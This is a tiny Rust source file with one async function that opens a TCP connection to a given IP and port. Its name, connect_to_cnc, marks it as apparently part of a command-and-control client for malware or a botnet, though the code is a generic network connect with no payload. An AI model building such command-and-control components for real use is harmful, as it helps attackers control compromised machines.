use tokio::net::TcpStream;

pub async fn connect_to_cnc(ip: &str, port: u16) -> Result<TcpStream, Box<dyn std::error::Error>> {
    let stream = TcpStream::connect(&format!("{}:{}", ip, port)).await?;

    Ok(stream)
}